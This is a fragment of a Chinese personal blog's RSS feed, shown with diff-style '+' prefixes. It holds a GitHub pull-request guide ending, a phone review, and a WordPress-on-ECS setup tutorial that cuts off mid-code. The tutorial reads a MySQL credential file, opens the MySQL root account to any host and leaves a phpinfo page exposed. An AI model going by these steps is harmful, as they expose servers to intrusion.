+&lt;p>点击 &lt;strong>Create pull request&lt;/strong> ，将你的分支汇入主分支。&lt;/p>
+&lt;p>&lt;strong>恭喜你！现在你已经完成了一个pr！现在等待管理批准你的pr！&lt;/strong>&lt;/p>
+&lt;p>此项目已启用bot来审核pr，所以如果你前面的步骤都ok，那么你很快就会从GitHub网页和Email收到成功通知；如果你的pr被驳回了，不要沮丧，检查你的每一步是否有错误。&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/012.png"
+width="920"
+height="751"
+srcset="https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/012_hu16888810517046068763.png 480w, https://blog.wuko.top/posts/2023/08/02/my_first_contribution.html/012_hu17218053799944324525.png 1024w"
+loading="lazy"
+alt="通过通知"
+class="gallery-image"
+data-flex-grow="122"
+data-flex-basis="294px"
+>&lt;/p>
+&lt;h2 id="尾声">尾声
+&lt;/h2>&lt;p>对于刚入门的小白来讲，想要跨过从无到有这一步很困难，但只要坚持走下去，就会&lt;strong>复行数十步，豁然开朗&lt;/strong>，共勉。&lt;/p></description></item><item><title>Xiaomi XAGA 购机与使用体验</title><link>https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/</link><pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/</guid><description>&lt;img src="https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/003.jpg" alt="Featured image of post Xiaomi XAGA 购机与使用体验" />&lt;h1 id="xiaomi-xaga-购机与使用体验">Xiaomi XAGA 购机与使用体验
+&lt;/h1>&lt;h2 id="写在前面">写在前面
+&lt;/h2>&lt;p>Xiaomi xaga即Redmi Note11TPro/Poco X4 GT的工程代码，仅作业系统与发售地区不同。&lt;/p>
+&lt;p>&lt;strong>本文所写仅代表本手机本人主观体验感受，仅供参考。本文所描述仅限本人手持机器情况，可能存在机器间差异&lt;/strong>&lt;/p>
+&lt;p>手机：Redmi Note11T Pro 8+128 操作系统：MIUI 13.0.11 Android12&lt;/p>
+&lt;h2 id="购入">购入
+&lt;/h2>&lt;p>作为本人的第一台智能手机，虽然很想预算拉满，奈何钱包实力不允许，最后在拼夕夕百亿补贴平台以1489RMB购入了黑色款8+128的这台机器。&lt;/p>
+&lt;p>当时是22年的11月初，连续一个多月的网课使旧手机本就不富裕的电池容量更是雪上加霜。在一次线上考试途中手机直接黑屏断电后，本人毅然决然决定换手机。&lt;/p>
+&lt;img src="001.jpg" alt="崩掉的续航" style="zoom:50%;" />
+&lt;p>与家人商量后，家人表示支持并立刻打了钱过来，告诉我自己做决定。打来的钱和我原本有的（实际上大部分还是爸妈给的，呜呜家里人对我真好）加起来，预算在1500RMB左右。参考了朋友与酷安老哥们的推荐，最后选中了这台机器。下单，付款，接下来就是漫长的等待了。&lt;/p>
+&lt;p>有个没拿到机子前就不爽的点：背刺。本以为我躲过了白色和512G的背刺，却没想到下单后十天相同价格在狗东旗舰店可以拿下8+256甚至是12+256的配置：（（（，不过好在这之后这机子的价格就没大跌了，所以还行。&lt;/p>
+&lt;h2 id="到货">到货
+&lt;/h2>&lt;p>因为疫情封控，下单后二十多天才收到手机。又因为我没有能拍清画面的手机，所以并没有外观图片，开箱视频还是借别人手机录制的&amp;hellip;&lt;/p>
+&lt;p>拼夕夕北京发货，发货后就有了IMEI，在&lt;a class="link" href="https://m.buy.mi.com/hk/registration" target="_blank" rel="noopener"
+>小米香港官网&lt;/a>查询出库日期，为发货前7天，后封机概率比较低，此时我悬着的心下放了一半。&lt;/p>
+&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/002.png"
+width="715"
+height="768"
+srcset="https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/002_hu18104897846587827382.png 480w, https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/002_hu17856392989174183079.png 1024w"
+loading="lazy"
+alt="出库查询"
+class="gallery-image"
+data-flex-grow="93"
+data-flex-basis="223px"
+>&lt;/p>
+&lt;p>到货后，检查完包装外观确认无瑕疵后，通电开机，通过系统引导，便开始了激动人心的MIUI体验。&lt;/p>
+&lt;h2 id="体验">体验
+&lt;/h2>&lt;h3 id="外观">外观
+&lt;/h3>&lt;p>相对于先前用的手机来说，基本上都是优点，但也有几点不满意的地方，比如直角边框。虽然看起来挺不错，但是握持十分硌手&amp;hellip;所幸官方自带了清水壳，装上后十分圆润。&lt;/p>
+&lt;p>摄像头突出，因为之前用的都是5、6年前的手机，所以对这点感触挺大的，&lt;del>没办法平放桌子上打引诱了：（，不过也能理解&lt;/del> 这手机打音游会断触！！&lt;/p>
+&lt;p>最不适应的是这个手机的比例，单手比较难点到上半部分内容，而且有些软件和游戏对这个比例没有适配。&lt;/p>
+&lt;h3 id="属性">属性
+&lt;/h3>&lt;p>到手先跑了一次娱乐兔，总分74w储存6.8万，应该是中等水平，我很满意。按照酷安里的方法查了屏幕和存储的厂家，分别是华星和三星（到手就看出来了是华星屏，因为用光侧照会发红），这应该不是一等奖就是二等奖了（按宣传华星比天马护眼，实际我也不知道了），不过三星跑分居然不如海力士，不科学。&lt;/p>
+&lt;p>大电池带来的安全感满满的，90Hz下WIFI可刷10小时视频，后面日常120Hz差不多9h亮屏时长。&lt;/p>
+&lt;p>相对于先前用的手机，这台的屏幕确实护眼，至少本人的眼疲劳得到了大大缓解，后面直接饱和度护眼拉满，妈妈再也不用担心我的视力了（不）。&lt;/p>
+&lt;h3 id="系统">系统
+&lt;/h3>&lt;p>这是我第一次长期使用MIUI，对比我之前使用的EMUI，体验升级了许多，不得不感慨技术的发展。比如先前为了实现全自动任务折腾Tasker，换MIUI后直接有了系统级的代替。但还是要批评MIUI机型区别对待，并且许多功能都需折腾后才能使用，比如自动任务、自动字幕等等。瑕不掩瑜，MIUI是目前我最喜欢的系统了，虽然还有许多能做得更好的地方。&lt;/p>
+&lt;h3 id="拍照">拍照
+&lt;/h3>&lt;p>&lt;img src="https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/003.jpg"
+width="5568"
+height="4166"
+srcset="https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/003_hu15944171584968477610.jpg 480w, https://blog.wuko.top/posts/2023/02/02/xiaomi-xaga-%E8%B4%AD%E6%9C%BA%E4%B8%8E%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C.html/003_hu7689383477186133457.jpg 1024w"
+loading="lazy"
+alt="003"
+class="gallery-image"
+data-flex-grow="133"
+data-flex-basis="320px"
+>&lt;/p>
+&lt;p>&lt;em>无压缩，图片较大，加载可能较慢&lt;/em>&lt;/p>
+&lt;p>不说话，放张旅游时用谷歌相机拍的图像，随手拍的。&lt;/p>
+&lt;h2 id="总结">总结
+&lt;/h2>&lt;p>非常棒手机，爱来自wuko（（（&lt;/p>
+&lt;p>非常称心所愿的一个机子，非常符合我对于梦中情机的想象，科技并带着。。。咳咳，一连三个非常，突出表现了作者对该机型的极高评价。大概之后再也买不到这样的手机了吧，听说这代是红米Note系列的lCD绝唱，LCD党落泪TAT。&lt;/p></description></item><item><title>记：ECS 云服务器初体验——搭建一个WP站点</title><link>https://blog.wuko.top/posts/2022/07/23/buildblog2.html/</link><pubDate>Sat, 23 Jul 2022 00:00:00 +0000</pubDate><guid>https://blog.wuko.top/posts/2022/07/23/buildblog2.html/</guid><description>&lt;img src="https://blog.wuko.top/posts/2022/07/23/buildblog2.html/cover.jpg" alt="Featured image of post 记：ECS 云服务器初体验——搭建一个WP站点" />&lt;h1 id="记ecs-云服务器初体验搭建一个wp站点">记：ECS 云服务器初体验——搭建一个WP站点
+&lt;/h1>&lt;h2 id="一前言">一，前言
+&lt;/h2>&lt;p>本人为一名在校学生，未来方向为计算机软件工程。之前一直对于服务器有浓厚兴趣，并在本地也搭建过，但苦于没有公网地址以及专门的机器。经网上查阅以及朋友推荐，发现了阿里云的这个&lt;strong>飞天加速计划&lt;/strong>，并成功领取到了一台ECS服务器。&lt;/p>
+&lt;p>相对于我之前使用智能手机搭建的服务器，它有许多优点：公网IP、更强大的性能、更稳定的运行、更完整的操作系统&amp;hellip;这次就来一了我之前想要搭建一个网页导航的愿望。&lt;/p>
+&lt;p>环境：Ubuntu 20.04&lt;/p>
+&lt;h2 id="二连接服务器">二，连接服务器
+&lt;/h2>&lt;p>一开始我打算使用我的PC连接，但因为win7并不自带ssh，遂手动安装，后也是成功连接到了服务器：
+&lt;a class="link" href="https://imgtu.com/i/jX96dP" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/07/23/jX96dP.png"
+loading="lazy"
+alt="jX96dP.png"
+>&lt;/a>
+但ssh在我的win7系统中频繁崩溃，便打算在手机上用Termux连接到服务器，但&amp;hellip;这不是又得戳屏幕吗？&lt;/p>
+&lt;p>就在我百思不得其解时，我发现在阿里云的控制面板中有一个名为&lt;strong>Workbench远程连接&lt;/strong>的功能。在输入密码后，终于是可以开搞了。&lt;/p>
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/jOpPrq" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/07/22/jOpPrq.png"
+loading="lazy"
+alt="jOpPrq.png"
+>&lt;/a>&lt;/p>
+&lt;h2 id="三安装环境与依赖">三，安装环境与依赖
+&lt;/h2>&lt;h3 id="安装apache">安装Apache:
+&lt;/h3>&lt;p>想要运行一个网站，就需要一个强大的后端。这里我选用了很多人都在用的 &lt;strong>Apache&lt;/strong>。&lt;/p>
+&lt;p>使用apt命令安装Apache和他的拓展包：&lt;/p>
+&lt;p>&lt;code>apt install apache2&lt;/code>&lt;/p>
+&lt;p>安装后用 &lt;code>service apache2 status&lt;/code>查看状态：&lt;/p>
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/jOCXa6" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/07/22/jOCXa6.png"
+loading="lazy"
+alt="jOCXa6.png"
+>&lt;/a>&lt;/p>
+&lt;h3 id="安装mysql">安装mysql:
+&lt;/h3>&lt;p>&lt;code>apt-get install mysql-server mysql-client&lt;/code>&lt;/p>
+&lt;p>同样使用 &lt;code>service mysql status&lt;/code>查看状态&lt;/p>
+&lt;p>使用命令 &lt;strong>cat&lt;/strong>查看默认密码 &lt;strong>/etc/mysql/debian.cnf&lt;/strong>：&lt;/p>
+&lt;p>&lt;code>sudo cat /etc/mysql/debian.cnf&lt;/code>&lt;/p>
+&lt;p>返回：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Automatically&lt;/span> &lt;span class="n">generated&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">Debian&lt;/span> &lt;span class="n">scripts&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">DO&lt;/span> &lt;span class="n">NOT&lt;/span> &lt;span class="n">TOUCH&lt;/span>&lt;span class="o">!&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="n">client&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">localhost&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">user&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">debian&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">maint&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">********&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">socket&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">mysqld&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">mysqld&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sock&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="n">mysql_upgrade&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">localhost&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">user&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">debian&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">maint&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">********&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">socket&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">mysqld&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">mysqld&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sock&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>记住你的密码（Password），后面要用到。&lt;/p>
+&lt;h3 id="开放端口">开放端口
+&lt;/h3>&lt;p>在 &lt;strong>控制面板&amp;gt;网络与安全&amp;gt;安全组&lt;/strong>中新增入方向：&lt;/p>
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/jOiZ01" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/07/22/jOiZ01.png"
+loading="lazy"
+alt="jOiZ01.png"
+>&lt;/a>&lt;/p>
+&lt;p>&lt;strong>注意：开放端口意味着其他人也可以在公网下访问你的服务器&lt;/strong>&lt;/p>
+&lt;p>完成后访问 &lt;strong>http://YOURIP/&lt;/strong>:&lt;/p>
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/jOiKfO" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/07/22/jOiKfO.png"
+loading="lazy"
+alt="jOiKfO.png"
+>&lt;/a>&lt;/p>
+&lt;p>成功工作！&lt;/p>
+&lt;h3 id="安装php">安装PHP
+&lt;/h3>&lt;p>&lt;code>sudo apt install php libapache2-mod-php&lt;/code>&lt;/p>
+&lt;p>安装后重启Apache：&lt;/p>
+&lt;p>&lt;code>sudo systemctl restart apache2&lt;/code>&lt;/p>
+&lt;p>使用 &lt;strong>echo&lt;/strong> 命令创建一个PHP页面：&lt;/p>
+&lt;p>&lt;code>echo &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot; &amp;gt; /var/www/html/phpinfo.php&lt;/code>&lt;/p>
+&lt;p>访问 &lt;strong>http://YOURIP/phpinfo.php&lt;/strong>，出现页面即为成功安装PHP&lt;/p>
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/jOAip8" target="_blank" rel="noopener"
+>&lt;img src="https://s1.ax1x.com/2022/07/22/jOAip8.png"
+loading="lazy"
+alt="jOAip8.png"
+>&lt;/a>&lt;/p>
+&lt;p>至此，所有的环境与依赖安装完毕。&lt;/p>
+&lt;h2 id="四wordpress的安装">四、wordpress的安装
+&lt;/h2>&lt;p>下载Wordpress的安装包（建议直接下载到 **/var/www/**下）：&lt;/p>
+&lt;p>&lt;code>wget https://cn.wordpress.org/latest-zh_CN.tar.gz&lt;/code>&lt;/p>
+&lt;p>下载后使用 &lt;strong>tar&lt;/strong>命令解压：&lt;/p>
+&lt;p>&lt;code>tar -xvf latest-zh_CN.tar.gz&lt;/code>&lt;/p>
+&lt;p>解压后切换到wordpress目录，使用 &lt;strong>cp&lt;/strong>命令重命名示例配置文件为 &lt;strong>wp-config.php&lt;/strong>&lt;/p>
+&lt;p>&lt;code>cp wp-config-sample.php wp-config.php&lt;/code>&lt;/p>
+&lt;p>编辑它，将你的数据库信息放进去。&lt;/p>
+&lt;p>之后打开 &lt;strong>http://YOURIP/wordpress/wp-admin/install.php&lt;/strong>，按照提示即可！&lt;/p>
+&lt;p>大功告成！&lt;/p>
+&lt;p>&lt;a class="link" href="https://imgtu.com/i/jOX0HS" target="_blank" rel="noopener"
+>https://imgtu.com/i/jOX0HS&lt;/a>)&lt;/p>
+&lt;h2 id="五踩到的坑与总结">五，踩到的坑与总结
+&lt;/h2>&lt;h3 id="初次接触mysql无法登陆root用户">初次接触MySQL，无法登陆root用户
+&lt;/h3>&lt;p>原来只在内网环境下搭建过WP，当时只懂得对着教程CTRL+C/V。因为当时数据库和电脑是在同一个IP下，所以安装完MySQL后不用配置就直接可以安装WP；而这次数据库并不在本地，因此在本地连接时我遇到了这样的问题：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">mysqli_real_connect&lt;/span>&lt;span class="p">():&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">HY000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">1698&lt;/span>&lt;span class="p">):&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">Access&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">denied&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;root&amp;#39;&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="s1">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>当时遇到这个问题，我卡了4个多小时，尝试过重启MySQL、Apache等等，但都没有解决。后来上网查发现可能是root用户主机设置的问题，于是在服务器进入查询：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="n">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">host&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="c1">-----------+------------------+
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">host&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="c1">-----------+------------------+
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">debian&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">maint&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">infoschema&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">session&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">mysql&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="c1">-----------+------------------+
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">rows&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">in&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">00&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sec&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>果然我的root用户仅允许我在本地登录，于是我按照教程说的修改host：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">update&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">set&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">host&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;%&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;root&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="n">flush&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">privileges&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>查询后发现root的host确实变成了%，于是我再次尝试登录，却发现问题依然存在：&lt;/p>
+&lt;p>&lt;code>mysqli_real_connect(): (HY000/1698): Access denied for user 'root'@'localhost'&lt;/code>&lt;/p>
+&lt;p>最后没招了，突然有个想法，新建一个用户并给予其最大权限：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
